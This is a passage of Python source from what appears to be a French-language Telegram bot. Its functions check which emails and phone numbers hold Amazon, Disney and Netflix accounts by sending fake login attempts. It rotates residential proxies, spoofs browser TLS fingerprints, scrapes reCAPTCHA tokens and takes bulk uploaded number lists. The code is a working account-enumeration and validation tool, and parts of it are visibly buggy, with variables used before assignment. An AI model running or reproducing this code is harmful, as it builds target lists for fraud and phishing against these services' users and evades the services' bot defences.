            self.user.bot.delete_message(message.chat.id, message.id)



    @staticmethod
    def amazon(info: str) -> bool:
        amazon_data['email'] = info
        try:
            amazon_resp = requests.post(
                'https://www.amazon.fr/ap/signin',
                data=amazon_data,
                headers=amazon_headers
            )
            text = amazon_resp.text
            amazon_resp.close()
        except Exception as e:
            print(e)
            return None
        if 'Entrez votre mot de passe' in text:
            return True
        elif 'Numéro de téléphone incorrect' in text or 'Impossible de trouver un compte correspondant à cette adresse e-mail':
            return False
        else:
            # print(info)
            # print("captcha...")
            # time.sleep(5)
            return None
            

    @staticmethod
    def disney(info: str) -> bool:
        disney_data['variables']['email'] = info
        disney_resp = requests.post(
            'https://disney.api.edge.bamgrid.com/v1/public/graphql',
            json=disney_data,
            headers=disney_headers
        )

        return 'OTP' in disney_resp.text
    
    @staticmethod
    def netflix(num, chk):

        if num.startswith('+'):
            for code in ccodes:
                if code[2] in num:
                    num=num.replace(code[2],"")
                    country=code[0]
        else:
            country='FR'

        r = requests.get('https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR&co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&hl=fr&v=MuIyr8Ej74CrXhJDQy37RPBe&size=invisible&cb=y0gagce4qyp4')
        sess = Session(client_identifier='chrome112', random_tls_extension_order=True)
        soup = bs4.BeautifulSoup(r.text, 'html.parser')
        # print(r.text)
        basic_token = soup.find('input', {'id': 'recaptcha-token'})['value']
        r = sess.get('https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR&231co=aHR0cHM6Lys93d3cubmV0ZmxpeC5jb206NDQz&hl=fr&v=SglpK98hSCn2CroR0bKRSJl5&size=invisible&cb=d7akj8zgc35z')
        resp = requests.post(
            'https://www.google.com/recaptcha/enterprise/reload?k=6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR',
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            data=f'reason=q&c={basic_token}'
        )
        grospaylaod = '{"action":"loginAction","fields":{"nextPage":"","rememberMe":"true","countryCode":"COCO","countryIsoCode":"ISSSO","userLoginId":"MAMALENUM","password":"PAPASOWRD","recaptchaResponseToken":"CACAPTCH","recaptchaResponseTime":"226","previousMode":""}}'
        grospaylaod = grospaylaod.replace("CACAPTCH", recaptcha)

        
        data = {
                'param': grospaylaod,
                'allocations[55252]': '2',
                'allocations[58371]': '10',
                'esn': 'NFCDCH-02-KN9Y8H5RXPAEXAV5Y04L3MMPAL8Y5N',
                'authURL': authurl,
            }
        recv = r.text
     #   content = resp.text[4:]
        recaptcha = json.loads(resp.text[4:])[1]

        authurl = urllib.parse.unquote(r.text.split('authURL":"')[1].split('"')[0].replace("\\x", "%"))
        sess = Session(client_identifier='chrome112', random_tls_extension_order=True)

        print(f"R pour num: {recv}")
        rcjson = r.json()       
        numstatus = rcjson['jsonGraph']['aui']['moneyball']['next']['value']['result']['fields']['errorCode']['value']
        print(numstatus)
        global cprox
        prox = chk.proxs[cprox]
        cprox += 1
        
        if cprox == len(chk.proxs):
            cprox = 0
        proxy = f"https://{prox}"
        proxies = {"https": proxy, 'https': proxy}
        sess.proxies = proxies

        # print(proxy)


        r = sess.get('https://www.netflix.com/login')
        if not r.text:
            LINK = r.headers['Location']
            r = sess.get(LINK)

        else:
            LINK = 'https://www.netflix.com/login'

        authurl = r.text.split('<input type="hidden" name="authURL" value="')[1].split('"')[0]
        
        r = sess.get('https://www.netflix.com/personalization/cl2/freeform/WebsiteDetect?')

        
        code = [x[2] for x in ccodes if country in x][0]

        # from random import choice, randint

        psd = "".join(choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnoprstuvwxyz123456789") for _ in range(randint(8, 14)))

        data = {
        'userLoginId': num,
        'password': psd,
        'rememberMe': 'true',
        'flow': 'websiteSignUp',
        'mode': 'login',
        'action': 'loginAction',
        'withFields': 'rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode,recaptchaResponseToken,recaptchaError,recaptchaResponseTime',
        'authURL': authurl,
        'nextPage': '',
        'showPassword': '',
        'countryCode': code,
        'countryIsoCode': country,
        'cancelType': '',
        'cancelReason': '',
        'recaptchaResponseToken': recaptcha,
        'recaptchaResponseTime': '224'
        }

        from urllib.parse import urlencode

        data = urlencode(data)
        # print(data)

        scookies = sess.cookies.get_dict()

        import datetime, uuid

        consent_id = str(uuid.uuid4())
        date = datetime.datetime.now().strftime(r'%a+%b+%d+%Y+%H%%3A%M%%3A%S+GMT%z')

        optanon = f"isGpcEnabled=0&datestamp={date}%2B0200+(heure+d%E2%80%99%C3%A9t%C3%A9+d%E2%80%99Europe+centrale)&version=202301.1.0&isIABGlobal=false&hosts=&consentId={consent_id}&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&geolocation=FR%3BPAC&AwaitingReconsent=false"

        cookies = f"""OptanonAlertBoxClosed=2023-05-30T23:24:29.526Z; hasSeenCookieDisclosure=true; dsca=anonymous; flwssn={scookies['flwssn']}; nfvdid={scookies['nfvdid']}; SecureNetflixId={scookies['SecureNetflixId']}; NetflixId={scookies['NetflixId']}; OptanonConsent={optanon}"""

        headers = {
            "Cookie": cookies, 
            "Content-Type": "application/x-www-form-urlencoded"
            }


        # print("\n".join(f'{a}: {b}' for a, b in headers.items()))
        # print()
        # print(data)

        

        
        r = sess.post(
            LINK,
            headers=headers,
            data=data
        )

        from time import sleep

        if "Nous éprouvons des problèmes techniques" in r.content.decode('utf-8') or "We are having technical difficulties a" in r.content.decode('utf-8'):
            return None
        p = "Nous n'avons pas trouvé de compte" not in r.content.decode('utf-8') and "Sorry, we can't find an account" not in r.content.decode('utf-8')
        # if p:
        #     with open(f'ex/{num}.html', 'wb') as f:
        #         f.write(r.content)

        return p
    
    
    # @staticmethod
    # def netflix(info: str) -> bool:
    #     netflix_data['email'] = info
    #     netflix_resp = requests.post(
    #         'https://www.netflix.com/fr/login',
    #         data=netflix_data,
    #         headers=random_headers()
    #     )

    #     return 'Mot de passe oublié' in netflix_resp.text




def get_list(user: 'users.User', ml = False) -> list[str]:
    ask_msg = user.send(BASE(user, f'_〢 Veuillez envoyer le fichier contenant la NL {"/ ML" if ml else ""}_ 📝'), markup=Markups.CANCEL)
    message = user.wait_for_msg(ask_msg)
    
    if message is None:
        return
    nlfile = user.bot.get_file(message.document.file_id)
    nl = user.bot.download_file(nlfile.file_path)
    # user.bot.delete_message(message.chat.id, message.id)
    # user.send_fr(
    #         'Début du tri'
    #     )

    return list(set(nl.decode().splitlines()))

def get_prox(user: 'users.User') -> list[str]:
    ask_msg = user.send_fr(BASE(user, '_〢 Veuillez envoyer le fichier contenant les proxys_ 📝\n\n🔬 | Il vous faut des proxys résidentiels HTTPS, nous conseillons ces providers: https://proxies.black/ https://rainproxy.io/'), markup=Markups.CANCEL)
    message = user.wait_for_msg(ask_msg)
    
    if message is None:
        return
    nlfile = user.bot.get_file(message.document.file_id)
    nl = user.bot.download_file(nlfile.file_path)
    # user.bot.delete_message(message.chat.id, message.id)
    # user.send_fr(
    #         'Début du tri'
    #     )

    return list(set(nl.decode().splitlines()))


def get_count(user: 'users.User', markup=Markups.CANCEL) -> list[str]:
    ask_msg = user.send(BASE(user, '_〢 Combien de numéros souhaitez-vous génerer ❓_ \n_(p.e: 25000)_\n \nNote: Au delà de 50k, la génération risque de prendre du temps [100k = 4minutes]'), markup=Markups.CANCEL)
    message = user.wait_for_msg(ask_msg)
    if message is None:
        return

    # user.bot.delete_message(message.chat.id, message.id)
    return int(message.text)




@staticmethod
def test_netflix(num, prox):

    if num.startswith('+'):
        for code in ccodes:
            if code[2] in num:
                num=num.replace(code[2],"")
                country=code[0]
    else:
        country='FR'

    r = requests.get('https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR&co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&hl=fr&v=MuIyr8Ej74CrXhJDQy37RPBe&size=invisible&cb=y0gagce4qyp4')
    
    soup = bs4.BeautifulSoup(r.text, 'html.parser')
    # print(r.text)
    basic_token = soup.find('input', {'id': 'recaptcha-token'})['value']

    resp = requests.post(
        'https://www.google.com/recaptcha/enterprise/reload?k=6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR',
        headers={'Content-Type': 'application/x-www-form-urlencoded'},
        data=f'reason=q&c={basic_token}'
    )

    content = resp.text[4:]
    recaptcha = json.loads(content)[1]


    sess = Session(client_identifier='chrome112', random_tls_extension_order=True)

    
    proxy = f"https://{prox}"
    proxies = {"https": proxy, 'https': proxy}
    sess.proxies = proxies

    print(proxy)


    r = sess.get('https://www.netflix.com/login')
    if not r.text:
        LINK = r.headers['Location']
        r = sess.get(LINK)

    else:
        LINK = 'https://www.netflix.com/login'

    authurl = r.text.split('<input type="hidden" name="authURL" value="')[1].split('"')[0]
    
    r = sess.get('https://www.netflix.com/personalization/cl2/freeform/WebsiteDetect?')

    
    code = [x[2] for x in ccodes if country in x][0]

    # from random import choice, randint

    psd = "".join(choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnoprstuvwxyz123456789") for _ in range(randint(8, 14)))

    data = {
    'userLoginId': num,
    'password': psd,
    'rememberMe': 'true',
    'flow': 'websiteSignUp',
    'mode': 'login',
    'action': 'loginAction',
    'withFields': 'rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode,recaptchaResponseToken,recaptchaError,recaptchaResponseTime',
    'authURL': authurl,
    'nextPage': '',
    'showPassword': '',
    'countryCode': code,
    'countryIsoCode': country,
    'cancelType': '',
    'cancelReason': '',
    'recaptchaResponseToken': recaptcha,
    'recaptchaResponseTime': '224'
    }

    from urllib.parse import urlencode

    data = urlencode(data)
    # print(data)

    scookies = sess.cookies.get_dict()

    import datetime, uuid

    consent_id = str(uuid.uuid4())
    date = datetime.datetime.now().strftime(r'%a+%b+%d+%Y+%H%%3A%M%%3A%S+GMT%z')

    optanon = f"isGpcEnabled=0&datestamp={date}%2B0200+(heure+d%E2%80%99%C3%A9t%C3%A9+d%E2%80%99Europe+centrale)&version=202301.1.0&isIABGlobal=false&hosts=&consentId={consent_id}&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&geolocation=FR%3BPAC&AwaitingReconsent=false"

    cookies = f"""OptanonAlertBoxClosed=2023-05-30T23:24:29.526Z; hasSeenCookieDisclosure=true; dsca=anonymous; flwssn={scookies['flwssn']}; nfvdid={scookies['nfvdid']}; SecureNetflixId={scookies['SecureNetflixId']}; NetflixId={scookies['NetflixId']}; OptanonConsent={optanon}"""
   
    headers = {
        "Cookie": cookies, 
        "Content-Type": "application/x-www-form-urlencoded"
        }


    # print("\n".join(f'{a}: {b}' for a, b in headers.items()))
    # print()
    # print(data)

    

    
    r = sess.post(
        LINK,
        headers=headers,
        data=data
    )

    from time import sleep

    if "Nous éprouvons des problèmes techniques" in r.content.decode('utf-8') or "We are having technical difficulties a" in r.content.decode('utf-8'):
        return None
    p = "Nous n'avons pas trouvé de compte" not in r.content.decode('utf-8') and "Sorry, we can't find an account" not in r.content.decode('utf-8') and "Sorry, we can't find an account with this email address" not in r.content.decode('utf-8') and "Désolé, il n'y a pas de compte associé à cette adresse courriel" not in r.content.decode('utf-8')
    # if p:
    #     with open(f'ex/{num}.html', 'wb') as f:
    #         f.write(r.content)

    return p
